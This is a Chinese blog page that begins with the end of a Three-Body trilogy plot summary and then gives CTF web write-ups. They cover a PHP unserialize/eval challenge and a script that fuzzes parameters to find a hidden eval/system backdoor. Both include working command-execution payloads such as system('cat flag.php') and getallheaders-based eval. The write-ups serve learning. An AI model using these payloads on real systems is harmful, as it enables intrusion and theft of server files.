<p>​        程心现在明白了，什么掩体，什么安全声明，只有光速飞船才是活路。云天明指出了这条路，而程心却把它堵死了。程心到头来，还是犯了第二次错误。程心开始恨维德，为什么要履行承诺。在通话的最后一刻，罗辑说，我要进画里了，孩子们走好。</p>
<p>​        飞船要进入光速了，程心突然想到自己还有个约会。程心说，去我们的星星。于是，太阳系仅存的两个女人，给忘了云天明送给程心的星星。一段时间后，星环号到了这颗恒星，并在一颗蓝色的行星上降落了。在这颗蓝星上有一个帅气的男人在迎接他们。这个人，名叫关一帆。是万有引力号上的研究员，五年前才在冬眠中被唤醒。他收到了星环号的引力波信号，所以留在这等她们。从这个人的口中，二人得知，到头的万有引力号和蓝色空间号上的人，成功创建了四个世界，并且还在扩张中。这颗蓝星上，没有高等生命，像是原始的地球。他们三人在这待了一段时间。</p>
<p>​        有一天，关一帆发现，临近的另一颗灰色行星上有飞船的踪迹。关一帆要去前往查看，程心要跟着，因为她想这可能和云天明有关。AA留在蓝星等着他们回来。二人乘坐关一帆的亨利号，前往灰星。在飞船上，关一帆高速程心，宇宙中最可怕的武器就是，宇宙规律。二向箔就是其中之一。二向箔在高等文明那很常用，它一旦展开就会无限扩张，所以，总有一天，整个宇宙也会二维化。宇宙正在死去，一些大神级文明，他们已经在研究，如何将自己二维化后，能继续活在二维世界里。大概在一百多亿年前，宇宙起码有十维。经过不断地星际战争，宇宙才变成先进的三维。有一批大神级文明，他们在努力使宇宙重启。</p>
<p>​        航行了几天，飞船抵达了灰星，在那里，他们没有找到云天明，而是看见了高等外星文明留下的死线。死线极其的黑，任何东西进去，都出不来，连光也一样。死线随时会破裂，破裂后的死线会形成低光速带，成为黑域。在这片区域里，光会变得非常慢。关一帆看到这一场景，连忙带着程心飞回蓝星，在返回的过程中，亨利号收到了AA的通讯，AA激动地告诉程心，云天明来了，现在就在蓝星上，我去找他过来和你说话。为了保证通讯安全，不被周围的外星人发现。不用了，我们马上就回去，随机关掉了通讯。正当程心他们要回到蓝星时，突然死线破裂，他俩进入了时间真空。十六天后，程心和关一帆，才脱离了黑域，回到了蓝星。在时间真空里虽然只过了16天，但此时，蓝星上已经过了一千八百九十万年。</p>
<p>​        程心很难过。因为她永远错过了云天明。二人用探测器发现了刻在石头上巨大无比的几个字，上面写着，我们度过了幸福的一生。我们送给你们一个小宇宙，在里面躲过坍缩，去新的世界。</p>
<p>​        他们发现了这个小礼物，这是一个由微亮细线画出来的门，两人牵着手，一同进入了这扇门。这里是一个一立方千米的循环空间，如果你从头跑到尾，你会发现，自己又回到了起点。在这个空间里，有一片美丽的田园。生活用品，一应俱全。这篇小天地就是云天明送给程心的第二件礼物，一个小宇宙。程心在这里看见了老朋友，智子。她用的躯壳还是跟地球上的外形一样。智子，是这里的管家，智子对程心说，宇宙很大，生活更大，我们真的又相会了。</p>
<p>​        智子告诉他们，这里是云天明送给二位的礼物，在这，时间会过得非常慢，只需在这待上十年，外面的宇宙，就会重启。程心和关一帆在这开始了甜蜜的生活，智子成为了他俩的老师。教他们三体里的知识，生活了许久后，他们收到了一个大神级文明向全宇宙广播的信号，这个信号包含了百万种语言，都是大神级文明，认为值得被通知的外星文明。在这信息中，他们发现了人类和三体人的语言。内容大致如下，请把你们制造的小宇宙归还到大宇宙中，大宇宙因为你们偷走的质量，将会在膨胀中死去。归还小宇宙，意味着在里面的居住者要回到大宇宙中。程心和关一帆决定归还小宇宙返回大宇宙中。</p>
<p>​        智子开始负责归还小宇宙，在这个小宇宙的底下，藏有一艘小型飞船，这艘飞船浓缩了三体世界最先进的技术。程心没有把这个小宇宙全部归还，她在这留下了五公斤。留下了一个生态球，里面养着小鱼。她希望，这个空间里还能有生命存在。智子对两位朋友说到，放心，我在，你们就在。随后，飞船启动，飞向了未知的大宇宙。</p>
<p>​        三体系列的整个故事，到此结束了。程心这一辈子，都在攀登一道责任的阶梯，小时候的她责任是好好学习，不让爸妈失望，努力成为一个优秀的人。长大后，她要为工作负责，为阶梯计划负责。后来云天明送个她的一颗星星。促使她成为了执剑人，这时的她要为全人类负责。后来她的责任变得复杂起来，本来她想给人插上光速飞行的翅膀，却不得不制止。最后她要为整个宇宙负责，归还属于自己的小宇宙。</p>
<p>​        人类，在面对即将到来的黑暗森林打击时，由于受到道德枷锁的限制，错出了很多决策失误，导致太阳系不复存在。只有程心与AA从太阳系逃出。三体系列的整个故事，告诉了我们一个整理。在浩瀚的宇宙中，永恒的只有死神。</p>
<h2 id="原视频链接"><a href="#原视频链接" class="headerlink" title="原视频链接:"></a>原视频链接:</h2><p><a href="https://www.weibo.com/tv/v/HFze2EH9A?fid=1034:4399060850003080" target="_blank" rel="noopener">https://www.weibo.com/tv/v/HFze2EH9A?fid=1034:4399060850003080</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2019/07/31/The_Fifth_Day_for_Web/">
                The Fifth Day for Web
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-07-31</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="The-Fifth-Day-for-Web"><a href="#The-Fifth-Day-for-Web" class="headerlink" title="The Fifth Day for Web"></a>The Fifth Day for Web</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>别问第四天去哪了，昨晚想做题的时候，buuoj.cn好像被d了，啊凑~。（今天的buuoj也仍然崩着23333，所以今天去做了西电招新赛的题）</p>
<h3 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h3><p>代码审计题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//flag在flag.php里 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $cmd=<span class="string">'index.php'</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/\w+\((?R)?\)/'</span>, <span class="keyword">$this</span>-&gt;cmd))&#123; </span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'$a="'</span>.<span class="keyword">$this</span>-&gt;cmd.<span class="string">'";'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hack!!!'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'fl'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'ag'</span>])) &#123; </span><br><span class="line">    <span class="keyword">die</span>(@highlight_file(<span class="string">'index.php'</span>,<span class="keyword">true</span>)); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">if</span> (!(preg_match(<span class="string">'/[A-Za-z0-9]+\(/i'</span>, $_GET[<span class="string">'fl'</span>]))) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hack!!!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">echo</span> unserialize($_GET[<span class="string">'ag'</span>]); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>首先，fl 和 ag要赋值</p>
</li>
<li><p>然后，fl这个正则是任意字母数字加一个左括号</p>
</li>
</ol>
<p>那么，fl=123(</p>
<ol start="3">
<li>然后是ag的值</li>
</ol>
<p>这里有个反序列化，在加上flag类有一个魔术方法__destruct()，并且魔术方法中的cmd的值可控，所以构成反序列化漏洞。</p>
<p>然后ag也有一个正则匹配，/\w+\((?R)?\)/，规则就是字符串加一对括号，比如phpinfo()，(?R)?是递归，即</p>
<p>phpinfo(phpinfo())，phpinfo(phpinfo(phpinfo()))，这样都可以过正则。</p>
<p>所以接下来要考虑的就是怎么构造ag来拿到flag</p>
<p>首先eval函数里是，$a=”???”;</p>
<p>是一个赋值语句，这显然没办法拿到flag，所以考虑闭合他，构造cmd=a()”;        (这样是为了绕过正则)</p>
<p>然后再加点，cmd=a()”;phpinfo();//</p>
<p>序列化得：O:4:”flag”:1:{s:3:”cmd”;s:17:”a()”;phpinfo();//“;}</p>
<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564557457854.png" alt="1564557457854"></p>
<p>发现网页崩了，去问了出题人，出题人说我都没走进destructi方法（wtf？）</p>
<p>后来我发现，把源代码中</p>
<p>else {<br>        echo unserialize($_GET[‘ag’]);<br>    } </p>
<p>里面的echo去掉才能反序列化，（这又是为啥）</p>
<p>然后出题人说，把序列化字符串里的对象数目改成2就可以了，（嗯么？）</p>
<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564557470651.png" alt="1564557470651"></p>
<p>果然成功了（所以为啥？）</p>
<p>那么接下来方法就有很多了，我直接写了一个任意文件包含加php伪协议来读取，</p>
<p>payload：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/39.105.168.42:8001/</span>?fl=<span class="number">123</span>(&amp;ag=<span class="symbol">O:</span><span class="number">4</span><span class="symbol">:<span class="string">"flag"</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">3</span><span class="symbol">:<span class="string">"cmd"</span></span>;<span class="symbol">s:</span><span class="number">74</span><span class="symbol">:<span class="string">"a()"</span></span>;<span class="keyword">include</span><span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;<span class="regexp">//</span><span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后师傅们还有别的方法，直接system</p>
<p>payload：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/39.105.168.42:8001/</span>?fl=<span class="number">123</span>(&amp;ag=<span class="symbol">O:</span><span class="number">4</span><span class="symbol">:<span class="string">"flag"</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">3</span><span class="symbol">:<span class="string">"cmd"</span></span>;<span class="symbol">s:</span><span class="number">30</span><span class="symbol">:<span class="string">"a()"</span></span>;system(<span class="string">'cat flag.php'</span>);<span class="regexp">//</span><span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564557873866.png" alt="1564557873866"></p>
<p>但是出题人的预期解是不想让你在$ag这个字符串里的括号里面带参数的，（然而那个正则只匹配一次，a()”;system(cat flag.php)        这前半部分过了，正则就过了）</p>
<p>所以出题人原意是想让你用getallheaders()这个函数2333</p>
<p>payload:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">39.105</span>.<span class="number">168.42</span>:<span class="number">8001</span>/?fl=<span class="number">123</span>(&amp;ag=O:<span class="number">4</span>:<span class="string">"flag"</span>:<span class="number">2</span>:&#123;<span class="keyword">s</span>:<span class="number">3</span>:<span class="string">"cmd"</span>;<span class="keyword">s</span>:<span class="number">33</span>:<span class="string">"<span class="subst">$&#123;<span class="keyword">eval</span>(implode(getallheaders()))&#125;</span>"</span>;&#125;</span><br><span class="line"></span><br><span class="line">$a=$&#123;<span class="keyword">eval</span>(implode(<span class="keyword">system</span>(<span class="string">'cat flag.php'</span>);<span class="regexp">//</span>))&#125;</span><br><span class="line"></span><br><span class="line">再加上</span><br><span class="line"></span><br><span class="line">cmd: <span class="keyword">system</span>(<span class="string">'cat flag.php'</span>);<span class="regexp">//</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564559984788.png" alt="1564559984788"></p>
<p>（还可以多此一举的读一读base64后的源码23333， system(‘cat flag.php|base64’);//）</p>
<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564560169454.png" alt="1564560169454"></p>
<p>原理呢，，，（我直接用题目的网站测试了）</p>
<p>cmd: var_dump(getallheaders());//</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Wed, 31 Jul 2019 08:12:03 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.29 (Ubuntu)</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Content-Length</span>: 699</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">array(10) &#123;</span><br><span class="line">  ["cmd"]=&gt;</span><br><span class="line">  string(28) "var_dump(getallheaders());//"</span><br><span class="line">  ["Host"]=&gt;</span><br><span class="line">  string(18) "39.105.168.42:8001"</span><br><span class="line">  ["Cache-Control"]=&gt;</span><br><span class="line">  string(9) "max-age=0"</span><br><span class="line">  ["Upgrade-Insecure-Requests"]=&gt;</span><br><span class="line">  string(1) "1"</span><br><span class="line">  ["User-Agent"]=&gt;</span><br><span class="line">  string(115) "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"</span><br><span class="line">  ["Accept"]=&gt;</span><br><span class="line">  string(118) "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span><br><span class="line">  ["Accept-Encoding"]=&gt;</span><br><span class="line">  string(13) "gzip, deflate"</span><br><span class="line">  ["Accept-Language"]=&gt;</span><br><span class="line">  string(14) "zh-CN,zh;q=0.9"</span><br><span class="line">  ["Connection"]=&gt;</span><br><span class="line">  string(5) "close"</span><br><span class="line">  ["Content-Length"]=&gt;</span><br><span class="line">  string(1) "2"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cmd: var_dump(implode(getallheaders()));//</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Wed, 31 Jul 2019 08:12:32 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.29 (Ubuntu)</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Content-Length</span>: 346</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">string(331) "var_dump(implode(getallheaders()));//39.105.168.42:8001max-age=01Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3gzip, deflatezh-CN,zh;q=0.9close2"</span><br></pre></td></tr></table></figure>

<p>所以要把cmd写到第一行，后面cmd后面要加上//来注释掉后面所有的东西</p>
<p>相当于eval(“var_dump(implode(getallheaders()))”;)</p>
<p>然后命令$a=${eval(implode(getallheaders()))}    </p>
<h4 id><a href="#" class="headerlink" title="${}"></a>${}</h4><p>参考：<a href="https://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.variables.variable.php</a></p>
<p>有时候使用可变变量名是很方便的。就是说，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $a = <span class="string">'hello'</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。在上面的例子中 <em>hello</em> 使用了两个美元符号（$）以后，就可以作为一个可变变量的变量了。例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $$a = <span class="string">'world'</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这时，两个变量都被定义了：$a 的内容是“hello”并且 $hello 的内容是“world”。因此，以下语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"$a $&#123;$a&#125;"</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>与以下语句输出完全相同的结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"$a $hello"</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>它们都会输出：hello world。</p>
<p>所以${}里面的东西好像会当作PHP代码执行，</p>
<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564562302508.png" alt="1564562302508"></p>
<p>c并没有被赋值，然后${}里的内容确实被执行了。</p>
<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564562727517.png" alt="1564562727517"></p>
<p>但是这么测的时候，$c = eval(system(‘ls’));这条赋值语句，赋值的同时，命令也执行了。</p>
<p>但是针对这道题，去掉${}就解不出来了，可能是php版本还是什么的原因233333</p>
<p>（知道${}这玩意的作用就好了，溜了溜了~）</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2019/07/30/The_Third_Day_for_Web/">
                The Third Day for Web
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-07-30</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="The-Third-Day-for-Web"><a href="#The-Third-Day-for-Web" class="headerlink" title="The Third Day for Web"></a>The Third Day for Web</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>别问Second去哪了，拿去完成第一天的任务了，我凑~</p>
<p>今天继续来到buuoj看题，先看看高明的黑客</p>
<h3 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h3><p>先下载源码，然后看看发现里面会有一堆垃圾代码，但是也存在$_GET, $_POST，只不过几乎都被“封印”了，所以（面向wp做题）就知道要写脚本，给get，post传参构造能制造回显的参数，然后看是否有回显，有回显则证明那个地方可以被利用。</p>
<p>赵师傅脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">path = <span class="string">"/Users/jinzhao/PhpstormProjects/qwb/web2/"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(file)</span>:</span></span><br><span class="line">    f = open(path + <span class="string">"/"</span> + file);  <span class="comment"># 打开文件</span></span><br><span class="line">    iter_f = iter(f);  <span class="comment"># 创建迭代器</span></span><br><span class="line">    str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> iter_f:  <span class="comment"># 遍历文件，一行行遍历，读取文本</span></span><br><span class="line">        str = str + line</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个页面内所有参数</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_GET['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">7</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        params[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_POST['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">8</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># eval test</span></span><br><span class="line">    r = session.post(<span class="string">'http://localhost:11180/web2/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># assert test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = params[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = data[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost:11180/web2/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost:11180/web2/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("====================")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:  <span class="comment"># 遍历文件夹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):  <span class="comment"># 判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">        <span class="comment"># read_file(file)</span></span><br><span class="line"></span><br><span class="line">        pool.submit(read_file, file)</span><br></pre></td></tr></table></figure>

<p>运行结果如下：<img src="/2019/07/30/The_Third_Day_for_Web/1564375540326.png" alt="1564375540326"></p>
<p>然后去到这个文件，</p>
<p><img src="/2019/07/30/The_Third_Day_for_Web/1564375712837.png" alt="1564375712837"></p>
<p>找到利用点在这里，</p>
<p>所以构造payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web15.buuoj.cn<span class="regexp">/xk0SzyKwfzw.php?Efa5BVG=cat%20/</span>flag</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/30/The_Third_Day_for_Web/1564375802994.png" alt="1564375802994"></p>
<h4 id="learning"><a href="#learning" class="headerlink" title="learning"></a>learning</h4><p>这里用的是赵师傅的脚本，感觉自己写脚本能力太差了，所以今天就是自己写一份脚本，然后觉得赵师傅这里的脚本还可以再完善一下，可以直接拿flag的那种。</p>
<p>一下是构造脚本的，心路历程</p>
<p>首先，嫖一手赵师傅的文件名读取</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">path = <span class="string">"D:/phpstudy/PHPTutorial/WWW/src/"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br></pre></td></tr></table></figure>

<p>然后套路：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>main()函数呢</p>
